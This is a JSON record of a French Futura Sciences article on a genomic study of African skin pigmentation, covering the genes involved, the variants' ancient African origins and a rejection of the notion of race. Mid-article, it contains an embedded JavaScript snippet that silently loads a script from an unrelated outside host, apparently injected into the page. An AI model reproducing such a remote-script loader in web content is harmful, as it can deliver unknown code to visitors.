{"title": "Couleur de peau : les gènes réfutent la notion de race", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "13/10/2017", "content": "Des chercheurs américains ont étudié les gènes impliqués dans la couleur de peau chez les Africains. Ils ont trouvé que des variants génétiques associés à une peau claire ou à une peau foncée sont présents à la fois en Afrique et dans d'autres populations du monde. Ce qu'il faut retenir Les chercheurs ont étudié les génomes de près de 1.600 Africains. Ils ont identifié de nouveaux gènes impliqués dans la pigmentation de la peau. Les variants qui favorisent une peau claire ont une origine africaine. L'humanité se décline dans le monde avec toute une palette de couleurs de  peau . Jusqu'à présent, on connaissait peu de  gènes  liés à la  pigmentation  de la peau et ceux-ci ont plutôt été découverts dans des populations européennes. Or, en Afrique, les habitants n'ont pas tous la même  couleur  de peau. Quels sont les gènes qui expliquent cette diversité ? Pour le savoir, des chercheurs de l'université de Pennsylvanie ont mesuré la réflectance de la peau de plus de 2.000 Africains, en prenant une mesure au niveau du bras. La peau la plus sombre était celle d'une population d'Afrique de l'est, et la plus claire celle des  chasseurs-cueilleurs  San en Afrique australe.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Quatre zones du génome associées aux différences de couleurs de peau Grâce aux informations  génétiques  provenant d'environ 1.600 personnes, les chercheurs ont trouvé quatre zones du  génome  associées aux différences de couleurs de peau. La région qui ressortait en premier se trouvait autour du gène SLC24A5. Un variant de ce gène est connu pour jouer un rôle dans la coloration claire de la peau de populations européennes et d'Asie du sud. Ce variant apparu il y a plus de 30.000 ans se retrouve dans des populations éthiopiennes et tanzaniennes qui ont des ancêtres en  Asie  du sud et dans le Moyen-Orient. Ceci suggère que le variant a été importé de ces régions. Une autre région du génome, contenant le gène MFSD12, était associée à la pigmentation de la peau. Ce gène est peu exprimé dans les peaux dépigmentées de personnes souffrant de  vitiligo , une maladie de la pigmentation de la peau. Les chercheurs ont trouvé que des mutations dans ou autour de ce gène, qui étaient associées à une pigmentation sombre, étaient fréquentes dans des populations sub-sahariennes, mais pas chez les San à la peau plus claire. Ces variants étaient aussi présents dans des populations indiennes et australo-mélanésiennes qui ont elles aussi une peau sombre : les mêmes variants se retrouvent hors d'Afrique ! Les personnes qui ont une peau sombre en Inde du sud, en Australie ou en Nouvelle-Guinée n'auraient pas évolué indépendamment : elles auraient pu hériter ces variants sombres de populations venues d'Afrique. Les membres de la tribu San vivent en Afrique australe, comme au Botswana. © Ian Beatty, Wikipedia, CC BY-SA 2.0                        Des ancêtres africains à la peau claire Chez les San, des variants génétiques de MFSD12, OCA2 et HERC2 étaient plus fréquents. Or les gènes OCA2 et HERC2 ont été liés aux variations de couleur de peau, des  yeux , des cheveux chez les Européens.  Dans OCA2, les chercheurs ont identifié un variant courant chez les européens et les San, qui donnerait une  protéine  plus courte et moins fonctionnelle. Ce gène éclaircirait donc à la fois la peau des Européens et des  chasseurs-cueilleurs  du Botswana.  Dans cette étude, la plupart des variations génétiques associées avec une peau claire ou foncée sont apparues il y a plus de 300.000 ans. Certaines auraient émergé il y a un million d'années, bien avant l'apparition de l'Homme moderne ! Or, la version ancienne de ces variants était souvent celle d'une peau claire. Sarah Tishkoff, professeur à l'université de Pennsylvanie, a expliqué dans un  communiqué  :  « il est donc logique que la couleur de la peau chez les  ancêtres  des humains modernes ait pu être relativement claire. Il est probable que lorsque nous avons perdu les poils couvrant nos corps et que nous nous sommes déplacés des forêts vers la savane ouverte, nous avions besoin d'une peau plus foncée. » En effet, la couleur de peau peut être liée à une adaptation à l'environnement. Une peau sombre aide à prévenir les conséquences négatives de la  lumière  ultraviolette ( cancer de la peau ) ; une peau claire est plus efficace pour fabriquer de la  vitamine D  dans des régions du monde avec moins d' expositions aux UV . “ Il n'y a pas de race africaine. Ce travail paru dans la revue  Science  montre aussi que la génétique contredit la notion de races :  « il n'y a pas de race africaine. Nous montrons que la couleur de la peau est extrêmement variable sur le continent africain et qu'elle évolue encore. En outre, dans la plupart des cas, les variants génétiques associés à la peau claire sont apparus en Afrique. » Le saviez-vous ? Des cellules de la peau, les mélanocytes, possèdent des poches, les mélanosomes, contenant des molécules de pigment. La couleur de la peau varie en fonction du pigment : les mélanosomes contiennent des mélanges d’un pigment marron-noir (eumélanine) et d’un pigment jaune-rouge (phéomélanine).  L'environnement conditionne-t-il l’évolution de l’Homme ?                       Dans sa théorie de l’évolution, Darwin propose que le moteur la sélection naturelle soit la lutte pour la survie (struggle for life). Dans un environnement changeant, l’Homme, comme les autres espèces, est soumis à ces lois de l’évolution.                                       ", "theme": "sante"}